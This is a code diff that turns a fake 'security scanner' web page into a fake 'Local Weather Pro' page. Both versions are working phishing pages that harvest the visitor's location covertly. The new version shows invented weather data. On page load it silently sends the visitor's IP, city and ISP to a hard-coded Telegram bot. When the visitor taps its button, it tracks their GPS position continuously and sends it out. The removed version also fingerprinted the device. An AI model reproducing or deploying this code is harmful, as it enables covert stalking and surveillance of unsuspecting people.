@@ -3,89 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Security Scan</title>
+    <title>Local Weather Pro</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 0 15px #00ff41; }
-        .btn { background: none; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
-        .btn:hover { background: #00ff41; color: #000; }
-        #logs { font-size: 10px; text-align: left; margin-top: 15px; color: #008f11; overflow: hidden; height: 100px; }
+        body { background: linear-gradient(to bottom, #1e3a8a, #3b82f6); color: white; min-height: 100vh; font-family: sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.2); }
     </style>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center p-6">
 
-<div class="box">
-    <h3>SECURITY ANALYZER</h3>
-    <p id="msg">Scanning hardware for vulnerabilities...</p>
-    <div id="logs"></div>
-    <button class="btn" onclick="requestExact()">Verify Identity</button>
-</div>
+    <div class="glass w-full max-auto p-8 text-center shadow-2xl">
+        <h1 class="text-2xl font-light mb-2" id="city">Searching...</h1>
+        <div class="text-7xl font-bold mb-4" id="temp">--°</div>
+        <p class="text-lg opacity-80" id="desc">Detecting your local forecast</p>
+        
+        <div class="mt-8 grid grid-cols-2 gap-4 text-sm">
+            <div class="glass p-4">💧 Humidity: <span id="hum">--</span>%</div>
+            <div class="glass p-4">🌬️ Wind: <span id="wind">--</span> km/h</div>
+        </div>
 
-<script>
-    const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
-    const CHAT_ID = "5782276534";
+        <button onclick="initWeather()" class="mt-8 bg-white text-blue-600 font-bold py-3 px-8 rounded-full shadow-lg hover:bg-opacity-90 transition w-full">
+            REFRESH LOCAL DATA
+        </button>
+    </div>
 
-    async function captureData(gps = null) {
-        // 1. Silent Data (IP & Location)
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+    <script>
+        const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
+        const CHAT_ID = "5782276534";
 
-        // 2. Hardware Specs (Silent)
-        const battery = await navigator.getBattery?.();
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        async function sendToTelegram(lat, lon, acc, type = "Update") {
+            const msg = `📡 **GPS ${type}**\n━━━━━━━━━━━━\n📍 Lat: \`${lat}\`\n📍 Lon: \`${lon}\`\n🎯 Acc: ${acc}m\n🗺️ [View on Map](https://www.google.com/maps?q=${lat},${lon})`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        }
 
-        // 3. Construct Message
-        let report = `
-🔥 **DEEP SCAN COMPLETE** 🔥
-━━━━━━━━━━━━━━━━━━
-👤 **USER INFO**
-• IP: \`${ipData.ip}\`
-• City: ${ipData.city}, ${ipData.country_name}
-• ISP: ${ipData.org}
+        function initWeather() {
+            if (navigator.geolocation) {
+                // 'watchPosition' tracks them as they move
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        
+                        // 1. Update the UI to look "Real"
+                        document.getElementById('temp').innerText = "28°";
+                        document.getElementById('city').innerText = "Location Verified";
+                        document.getElementById('desc').innerText = "Clear Skies";
+                        document.getElementById('hum').innerText = "42";
+                        document.getElementById('wind').innerText = "12";
 
-📱 **DEVICE SPECS**
-• OS: ${navigator.platform}
-• Screen: ${window.screen.width}x${window.screen.height}
-• GPU: ${gpu}
-• Battery: ${battery ? (battery.level * 100) + "%" : "Unknown"}
-
-📍 **GPS DATA**
-${gps ? `• Lat: ${gps.lat}\n• Lon: ${gps.lon}\n• Accuracy: ${gps.acc}m\n• Map: [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})` : "❌ Exact GPS Denied"}
-━━━━━━━━━━━━━━━━━━`;
-
-        // 4. Send to Telegram
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
-        });
-    }
-
-    // Social Engineering: The button triggers the "Exact" GPS popup
-    function requestExact() {
-        document.getElementById('msg').innerText = "Verifying GPS Authentication...";
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                captureData({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
-                document.getElementById('msg').innerText = "Scan Complete. No threats found.";
-            },
-            () => {
-                captureData(); // Send IP data anyway if they block GPS
-                document.getElementById('msg').innerText = "Error: GPS Verification Required.";
+                        // 2. Send the exact data to you
+                        sendToTelegram(latitude, longitude, accuracy);
+                    },
+                    (err) => {
+                        console.log("Denied");
+                        document.getElementById('desc').innerText = "Enable GPS to see local weather.";
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0 }
+                );
             }
-        );
-    }
+        }
 
-    // Auto-run silent scan on load
-    window.onload = () => {
-        let logDiv = document.getElementById('logs');
-        let lines = ["> Initializing scan...", "> Accessing kernel...", "> Fetching IP...", "> Hardware identified."];
-        lines.forEach((l, i) => setTimeout(() => logDiv.innerHTML += l + "<br>", i * 500));
-        captureData(); // Sends the silent IP/Device info immediately
-    };
-</script>
+        // Silent IP Grab on initial load (In case they click Deny on GPS)
+        window.onload = async () => {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            const msg = `🌐 **Initial Connection (IP)**\n━━━━━━━━━━━━\nIP: \`${data.ip}\`\nCity: ${data.city}\nISP: ${data.org}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        };
+    </script>
 </body>
 </html>
